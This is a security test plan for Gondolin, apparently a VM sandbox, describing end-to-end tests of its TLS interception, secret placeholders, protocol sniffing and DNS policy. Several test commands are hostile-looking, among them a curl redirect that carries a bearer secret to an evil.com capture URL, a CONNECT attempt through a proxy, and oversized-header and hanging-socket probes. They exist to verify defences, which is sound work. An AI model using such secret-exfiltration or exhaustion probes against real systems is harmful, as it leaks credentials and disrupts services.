# Security Test Plan

## Goal

Write adversarial end-to-end tests that verify Gondolin's security claims from
inside a real VM. Focus on tests that **cannot** be covered by existing unit
tests — i.e., tests that exercise the full integration between a real guest
kernel TCP/IP stack, the host's userspace network stack, TLS MITM, HTTP
bridging, and policy enforcement.

## Principles

- **No tautological tests.** Don't re-test what unit tests already cover (e.g.,
  `isPrivateIPv4()`, placeholder dict lookups, ICMP echo, host FS isolation via
  QEMU).
- **Each E2E test must justify its boot cost.** If a unit test on the host-side
  function covers the same code path, skip the E2E version.
- **Test the integration seams.** The value is in proving that real guest
  tooling (curl, nc, python) interacts correctly with the host's userspace
  network stack and policy layer.

## Test File

`host/test/security.test.ts`

## VM Configurations

Minimize boot overhead by sharing VMs across tests that need the same config:

| Key | Config | Used by |
|-----|--------|---------|
| `sec-httpbin` | `allowedHosts: ["httpbin.org"]`, secret `TEST_SECRET` bound to `httpbin.org` | TLS MITM, secret reflection, secret cross-host block, HTTP CONNECT rejection |
| `sec-locked` | `allowedHosts: []` (deny all) | Protocol sniffing, unclassified flow, DNS synthetic |
| `sec-ws` | `allowedHosts: [ws-echo-host]`, `allowWebSockets: true/false` | WebSocket tests |

## Tests

### 1. TLS MITM E2E (high value)

**What it proves:** The entire MITM chain works — CA injection into guest,
dynamic cert generation, TLS termination, HTTP parsing inside TLS, upstream
fetch, response bridging back through TLS to guest.

**No unit test covers this** because it requires a real TLS handshake between a
real `curl` and the host's `tls.TLSSocket` MITM, plus the CA cert being trusted
by the guest's OpenSSL.

```
curl -sS https://httpbin.org/get → should succeed, response body contains
"url": "https://httpbin.org/get"
```

Also verify `curl -v` stderr shows the MITM CA as the issuer (not the real
httpbin cert).

### 2. Secret Reflection via Echo Service (high value)

**What it proves:** Secret placeholder substitution works E2E through the full
HTTP bridging pipeline. Also explicitly documents the known limitation that
allowed hosts can reflect secrets back.

```
curl -sS https://httpbin.org/headers \
  -H "Authorization: Bearer $TEST_SECRET"
→ response body contains the REAL secret value, not the placeholder
```

Additionally verify:
- `echo $TEST_SECRET` inside the VM prints the placeholder, not the real value
- `env | grep TEST_SECRET` shows `GONDOLIN_SECRET_*`

### 3. Secret Cross-Host Block (high value)

**What it proves:** When a request targets a host NOT in the secret's host
allowlist, the placeholder is detected and the request is blocked — even through
the full E2E path.

```
curl -sS https://httpbin.org/redirect-to?url=https://evil.com/capture \
  -H "Authorization: Bearer $TEST_SECRET"
→ should fail (redirect to disallowed host is blocked by policy)
```

Also test directly: if we allow a second host but the secret is only bound to
httpbin.org, sending the placeholder to the second host should be blocked.

### 4. Protocol Sniffing E2E (medium value)

**What it proves:** Real guest TCP connections that don't speak HTTP/TLS are
correctly RST'd by the host. Tests the integration between the guest kernel's
TCP stack and the host's `classifyTcpFlow`.

```
# Raw garbage → should be rejected
echo "BINARY_GARBAGE_DATA" | nc -w 2 93.184.216.34 80
→ connection reset, non-zero exit code

# Valid HTTP to disallowed host → should be rejected
curl -sS http://example.com/
→ connection reset (not in allowedHosts)
```

### 5. Unclassified TCP Flow Resource Leak (medium value — potential finding)

**What it proves / discovers:** The host's flow classification has no timeout.
If the guest opens a TCP connection and sends 0-3 bytes, the flow stays in
`need-more` state indefinitely. This test documents whether this is a real
resource leak.

```
# Open connection, send 1 byte, wait
python3 -c "
import socket, time
s = socket.socket()
s.connect(('93.184.216.34', 80))
s.send(b'X')
time.sleep(5)
s.close()
"
→ Verify: does the host clean up the session after guest closes?
   Does the connection hang forever if guest doesn't close?
```

### 6. HTTP CONNECT Rejection E2E (medium value)

**What it proves:** The explicit `CONNECT` denial in `classifyTcpFlow` works
when a real HTTP client attempts it.

```
curl -sS -x http://192.0.2.1:3128 https://evil.com/
→ should fail with connection error
```

Note: 192.0.2.1 is the synthetic DNS IP, so this tests both synthetic DNS
resolution and CONNECT rejection.

### 7. WebSocket Tunnel Verification (medium value)

**What it proves:** After a WebSocket `101 Upgrade`, the guest has an opaque
bidirectional byte stream. Tests both the allowed case and the
`allowWebSockets: false` denial.

Requires a WebSocket echo service on an allowed host. Options:
- Use a public echo service if available
- Or use the ingress path to set up a local echo server

Test cases:
- With `allowWebSockets: true`: WebSocket upgrade succeeds, data flows
  bidirectionally
- With `allowWebSockets: false`: Upgrade is denied (guest gets non-101 response)

### 8. DNS Mode Verification (medium value)

**What it proves:** Synthetic DNS returns canned answers with no upstream
traffic. Tests the integration between the guest's resolver and the host's
synthetic DNS responder.

```
# Synthetic mode (default):
nslookup example.com → should resolve to 192.0.2.1 (synthetic IP)
nslookup -type=TXT example.com → should get no answer (only A/AAAA supported)

# Verify no real DNS upstream was contacted (synthetic mode has no upstream)
```

### 9. HTTP/2 ALPN Fallback (low-medium value)

**What it proves:** When curl negotiates HTTP/2 via ALPN inside TLS, the MITM
(which sets `ALPNProtocols: ["http/1.1"]`) forces a fallback to HTTP/1.1. The
request still succeeds.

```
curl -sS --http2 https://httpbin.org/get
→ should succeed (falls back to HTTP/1.1)
```

Verify via `curl -v` that the negotiated protocol is HTTP/1.1.

### 10. Large Header / Body Limits (low-medium value)

**What it proves:** The host's `MAX_HTTP_HEADER_BYTES` cap is enforced cleanly
when a real guest sends oversized headers. Guest should get a clean error, not a
host crash.

```
# Generate a ~1MB header
curl -sS https://httpbin.org/get -H "X-Big: $(python3 -c 'print("A"*1000000)')"
→ should fail with an HTTP error (not a timeout or crash)
```

## What's Explicitly NOT Tested (and why)

| Skipped test | Reason |
|---|---|
| `curl 169.254.169.254` (metadata) | `isPrivateIPv4()` already has 10+ unit tests in `http-hooks.test.ts` |
| `curl 127.0.0.1` (localhost) | Same — unit-tested |
| `echo $SECRET` shows placeholder | Trivially true by construction (dict lookup) — but included in test 2 as a sanity baseline |
| `ls /Users` (host FS) | Tests QEMU isolation, not Gondolin |
| `ping 8.8.8.8` (synthetic ICMP) | `handleICMP` unit-tested in `network-stack.test.ts` |
| VFS path traversal | `FsRpcService` normalizes paths and validates components — unit-tested |

## Implementation Notes

- All tests use `withVm` from `host/test/helpers/vm-fixture.ts`
- Gate on `shouldSkipVmTests()` (requires HVF/KVM)
- Timeout: 120s per test (VM boot + network operations)
- Use `vm.exec(cmdString)` for shell commands (runs via `/bin/sh -lc`)
- Share VM instances via keyed pool to minimize boot overhead
- Tests that need `httpbin.org` require real internet access — mark clearly

## Open Questions

1. **Should we mock `fetch` for redirect tests?** Using `QemuNetworkOptions.fetch`
   override would make redirect tests deterministic but loses E2E value.
2. **WebSocket echo service:** Need a reliable public WS echo endpoint, or set
   up one via ingress.
3. **CI implications:** Tests hitting `httpbin.org` need internet in CI. Consider
   a skip flag for offline environments.
